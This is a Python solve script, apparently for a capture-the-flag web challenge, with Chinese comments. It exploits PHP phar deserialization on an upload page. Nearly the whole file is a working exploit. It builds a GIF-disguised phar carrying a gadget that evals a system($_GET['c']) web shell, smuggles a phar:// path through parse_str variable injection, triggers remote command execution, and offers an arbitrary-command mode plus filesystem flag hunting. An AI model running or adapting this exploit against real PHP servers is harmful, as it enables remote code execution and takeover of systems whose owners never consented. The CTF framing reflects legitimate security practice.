#!/usr/bin/env python3
"""upup_exec (Web 200) — PHP 7.4 phar 反序列化 RCE，纯标准库。

来源：决赛测试赛 transcript e6778af0（2026-09-10）。原 workspace 的
pharbuild.py / exploit.py / solve.sh 未留存，本脚本按 transcript 中的
格式推导与实测命令重建；重建假设与实测一致：Apache mod_php、web 根
/var/www/html、上传字段 image、POST 字段 upload、flag 在 /flag。

链条
----
1. upload.php（/www.zip 泄露，三层混淆解出）接受扩展名不在
   {php,PHP,phtml,sh,pht,htaccess,user.ini,asp,aspx,jsp}、大小 <=8192、
   finfo MIME 为 image/* 的文件，落盘 uploaded_images/<name>。
2. move 成功后执行 `@parse_str($_POST['upload']); if (file_exists($b))`。
   PHP 7 的单参 parse_str 注入局部变量，POST 字段
   `upload=b=phar://<绝对路径>` 即可让 file_exists 打开 phar。
3. class AnyClass::__destruct(){ eval($this->output); } 是 sink，但页面
   恒以未捕获 `throw new Error("start")` 结束——干净 phar 的元数据对象
   在请求关闭阶段才释放，而未捕获异常路径跳过它，__destruct 永不触发。
   绕过：phar 的全局 metadata 放 AnyClass gadget，唯一条目的 metadata
   故意写成不可反序列化的 `x:3:"str";`。phar_parse_pharfile() 先反序列
   化全局 metadata、随后在条目处 MAPPHAR_FAIL，失败路径
   phar_destroy_phar_data() 在请求中途释放归档 → __destruct 立即执行
   → eval($this->output)。SHA1 签名保持有效，phar.require_hash=On 通过。

本地验证（2026-09-11，aegisx/solver:full 的 PHP 8.4）：字节布局与
PHP 自产 phar 逐字段一致，Phar 只读打开/读条目/验签通过（clean 变体）。
「条目 metadata 畸形 → 请求中途析构」依赖 PHP <=8.2 在 manifest 解析期
急切反序列化条目 metadata；8.3+ 改为惰性，本地 8.4 不触发（目标 7.4，
transcript 实证成立）。结论与替代手法见 SOLVE.md。

用法：python3 solve.py <host:port 或 http://host:port> [命令]
环境变量 PHAR_ABS 可覆盖 phar 在靶机上的绝对路径（默认
/var/www/html/uploaded_images/evil_rce.phar）。
"""
import hashlib
import os
import re
import ssl
import struct
import sys
import urllib.error
import urllib.parse
import urllib.request
import zlib

PAYLOAD = "if(isset($_GET['c'])){system($_GET['c']);}"
PHAR_NAME = "evil_rce.phar"
PHAR_ABS = os.environ.get("PHAR_ABS", "/var/www/html/uploaded_images/" + PHAR_NAME)
# 不可反序列化的条目 metadata → phar 在 manifest 解析期失败 → 请求中途释放归档
ENTRY_META = b'x:3:"str";'
# finfo 只看魔术头；6 字节 GIF89a 即判定 image/gif
GIF = b"GIF89a\x01\x00\x01\x00\x00\x00\x00\x00"

# 靶机多为自签 https，不做证书校验
_OPENER = urllib.request.build_opener(
    urllib.request.HTTPSHandler(context=ssl._create_unverified_context())
)


def s16(v: int) -> bytes:
    return struct.pack("<H", v)


def s32(v: int) -> bytes:
    return struct.pack("<I", v)


def build_phar(payload=PAYLOAD, entry_meta=ENTRY_META, meta=None):
    """全局 metadata = AnyClass gadget、条目 metadata 可控的 phar。

    布局（小端）：stub | u32 manifest_len | manifest 体 | 文件数据 |
    sha1 签名 20B | u32 签名算法 2(SHA1) | 'GBMB'。
    entry_meta / meta 参数供本地构造 clean（合法 s:3:"str";）与
    全局畸形（AnyClass 计数 :2:{，WEB-05 式）变体验证用。
    """
    stub = b"GIF89a<?php __HALT_COMPILER(); ?>\r\n"
    p = payload.encode() if isinstance(payload, str) else payload
    if meta is None:
        meta = b'O:8:"AnyClass":1:{s:6:"output";s:%d:"%s";}' % (len(p), p)
    entry_name = b"a.txt"
    data = b"b"
    body = b"".join([
        s32(1),          # manifest 条目数
        s16(0x0011),     # Phar API 版本 1.1.1
        s32(0x10000),    # manifest flags: PHAR_HDR_SIGNATURE
        s32(0),          # alias 长度
        s32(len(meta)), meta,
        # 唯一条目
        s32(len(entry_name)), entry_name,
        s32(len(data)),            # 解压后大小
        s32(1786000000),           # 时间戳（任意）
        s32(len(data)),            # 压缩后大小
        s32(zlib.crc32(data) & 0xFFFFFFFF),
        s32(0x1A4),                # 条目 flags：权限 0644、无压缩
        s32(len(entry_meta)), entry_meta,
    ])
    out = stub + s32(len(body)) + body + data
    out += hashlib.sha1(out).digest() + s32(2) + b"GBMB"
    return out


def http_read(req: urllib.request.Request, timeout: int = 30) -> str:
    """页面恒以未捕获异常收尾（HTTP 500），成功信息也在错误响应体里。"""
    try:
        with _OPENER.open(req, timeout=timeout) as resp:
            return resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.read().decode("utf-8", "replace")


def post_multipart(url: str, fields: dict, filename: str, content: bytes,
                   ctype: str = "image/gif", timeout: int = 30) -> str:
    boundary = "----kb" + hashlib.md5(content).hexdigest()
    parts = []
    for k, v in fields.items():
        parts.append(
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n"
            f"\r\n{v}\r\n".encode()
        )
    parts.append(
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"image\"; "
        f"filename=\"{filename}\"\r\nContent-Type: {ctype}\r\n\r\n".encode()
        + content + b"\r\n"
    )
    parts.append(f"--{boundary}--\r\n".encode())
    req = urllib.request.Request(
        url,
        data=b"".join(parts),
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    return http_read(req, timeout=timeout)


def first_out(html: str) -> str:
    """命令输出出现在页面自身 HTML / fatal error 块之前，截掉后半段。"""
    for sep in ("<br />", "<br>", "Fatal error", "PHP Fatal"):
        i = html.find(sep)
        if i != -1:
            html = html[:i]
    return html.strip()


def extract_flags(out: str) -> list:
    """flag{...} / 32 位 hex / 裸长数字（测试赛形态）三种都要认。"""
    found = []
    for pat in (r"[A-Za-z][A-Za-z0-9_]{0,15}\{[!-~]{4,}\}",
                r"\b[0-9a-f]{32}\b",
                r"\b\d{16,64}\b"):
        found += re.findall(pat, out)
    return list(dict.fromkeys(found))


def trigger(base: str, cmd: str) -> str:
    """上传一张极小 GIF + 注入 b=phar:// 绝对路径；?c= 即命令。"""
    url = base + "/upload.php?" + urllib.parse.urlencode({"c": cmd})
    return post_multipart(
        url,
        fields={"upload": "b=" + PHAR_ABS},
        filename="real.gif",
        content=GIF,
    )


def main() -> None:
    if len(sys.argv) not in (2, 3):
        sys.exit("usage: solve.py <host:port|http://host:port> [command]")
    base = (sys.argv[1] if sys.argv[1].startswith("http")
            else "http://" + sys.argv[1]).rstrip("/")
    cmd = sys.argv[2] if len(sys.argv) == 3 else None

    phar = build_phar()
    print(f"[*] built {PHAR_NAME} ({len(phar)} bytes), phar path = {PHAR_ABS}")

    # 第一步：落盘 phar（upload 字段任意值即可过 isset 门）
    r = post_multipart(base + "/upload.php", fields={"upload": "zz=1"},
                       filename=PHAR_NAME, content=phar)
    if "Uploaded successfully" not in r:
        sys.exit(f"[-] upload failed, response head: {r[:300]!r}")
    print("[+] phar uploaded (Uploaded successfully)")

    # 第二步：触发反序列化。响应 = 命令输出 + 页面尾巴（ok + Fatal error）
    sanity = first_out(trigger(base, "id"))
    if "uid=" not in sanity:
        sys.exit(f"[-] trigger failed (no uid=), response head: {sanity[:300]!r}")
    print(f"[+] RCE: {sanity}")

    if cmd:  # 任意命令模式
        print(first_out(trigger(base, cmd)))
        return

    # 第三步：读 flag
    hunt = ("cat /flag /flag.txt /var/www/html/flag* 2>/dev/null; "
            "ls /; find / -maxdepth 2 -iname '*flag*' 2>/dev/null")
    out = first_out(trigger(base, hunt))
    print(f"[*] flag hunt output:\n{out}")
    flags = extract_flags(out)
    if not flags:
        sys.exit("[-] no flag pattern found — run with explicit command to hunt")
    for f in flags:
        print(f"[+] FLAG     : {f}")
        if "{" in f and "}" in f:
            print(f"[+] 提交裸值 : {f[f.index('{') + 1:f.index('}')]}")


if __name__ == "__main__":
    main()
